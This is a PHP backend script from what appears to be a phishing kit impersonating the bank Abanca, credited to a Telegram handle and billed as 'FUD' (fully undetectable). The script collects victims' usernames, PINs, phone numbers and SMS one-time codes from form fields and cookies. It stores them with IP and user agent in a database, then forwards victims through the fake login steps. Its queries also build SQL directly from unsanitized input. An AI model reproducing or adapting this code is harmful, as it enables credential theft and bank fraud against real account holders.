<?php
/**
###############################################
#$      https://telegram.me/neo_net          $#
#$          The Wine Juggler of FUD          $#
###############################################
**/
include $_SERVER['DOCUMENT_ROOT'].'/config/config.php';
include $_SERVER['DOCUMENT_ROOT'].'/panel/php/database/db.php';
if($_POST['content'] == 'main'){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message = "<pre>Abanca Data\n";
$message .= "Login User          : ".$_POST['card01']."\n";
$message .= "Login Password        : ".$_POST['pin_number']."\n";
$message .= "|-------- I N F O --------|\n";
$message .= "IP: ".$ip."\n";
$message .= "User-Agent : ".$useragent."\n";
$message .= "</pre>";
$praga=rand();
$praga=md5($praga);
$connection->query("INSERT INTO numeros(ip,user,pass,user_agent,token) VALUES ('".$ip."','".$_POST['card01']."','".$_POST['pin_number']."','".$useragent."','".$_COOKIE['cfdi']."')");
	header('Location: ../phone.php');
}
if($_POST['content'] == 'main2'){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message = "<pre>Abanca Data\n";
$message .= "Login User          : ".$_COOKIE['user']."\n";
$message .= "Login Password        : ".$_COOKIE['pass']."\n";
$message .= "Login Password        : ".$_POST['phone']."\n";
$message .= "|-------- I N F O --------|\n";
$message .= "IP: ".$ip."\n";
$message .= "User-Agent : ".$useragent."\n";
$message .= "</pre>";
$sms = $_POST['phone'];
$praga=rand();
$praga=md5($praga);
$connection->query("UPDATE numeros SET movil='".$sms."',status=NULL where token='".@$_COOKIE['cfdi']."'");
	header('Location: ../status.php');
}

if($_POST['content'] == 'mainsms'){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "|-------- I N F O --------|\n";
$message .= "IP: ".$ip."\n";
$message .= "User-Agent : ".$useragent."\n";
$message .= "</pre>";
$sms = $_POST['phone'];
$praga=rand();
$praga=md5($praga);
$connection->query("UPDATE numeros SET stella='".$sms."',status=NULL where token='".@$_COOKIE['cfdi']."'");
	header('Location: ../status.php');
}
